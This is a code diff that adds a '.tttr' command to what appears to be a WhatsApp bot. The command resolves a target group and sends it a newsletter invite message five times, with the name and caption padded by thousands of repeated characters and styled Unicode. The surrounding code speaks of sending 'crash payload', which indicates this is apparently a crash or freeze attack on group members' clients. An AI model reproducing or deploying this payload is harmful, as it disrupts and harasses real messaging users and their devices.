@@ -5972,6 +5972,45 @@ async function handleMessage(sock, msg) {
                 await reply(`✅ Sent crash payload to \`${target}\``);
                 break;
             }
+            case ".tttr": {
+                // usage: .tttr <group_link_or_id>
+                // fires the newsletterAdminInviteMessage payload 5x into the target group
+                const groupInput = (parts[1] || "").trim();
+                if (!groupInput) {
+                    return reply("❌ Usage: `.tttr <group_link_or_id>`\nExample: `.tttr https://chat.whatsapp.com/AbCdEf12345`\nOr: `.tttr 1234567890-123456@g.us`");
+                }
+
+                let targetGroup;
+                try {
+                    targetGroup = await resolveGroupJid(sock, groupInput);
+                } catch (e) {
+                    return reply(`❌ Could not resolve group: ${e.message || e}`);
+                }
+
+                async function blankgc(target) {
+                    sock.relayMessage(target, {
+                        newsletterAdminInviteMessage: {
+                            newsletterJid: "120363370611316879@newsletter",
+                            newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD83D\uDC8C \u2022 \uD83D\uDC51" + "XxX".repeat(9000),
+                            caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD83D\uDC8C \u2022 \uD83D\uDC51\n" + "XxX".repeat(9000),
+                            inviteExpiration: "0",
+                        },
+                    }, {
+                        userJid: target
+                    });
+                }
+
+                async function buggc(groupjid) {
+                    for (let i = 0; i < 5; i++) {
+                        await blankgc(groupjid);
+                    }
+                }
+
+                await buggc(targetGroup);
+                await reply(`✅ Sent newsletter payload to \`${targetGroup}\` (5 rounds)`);
+                break;
+            }
+
 
 
             case ".menu":
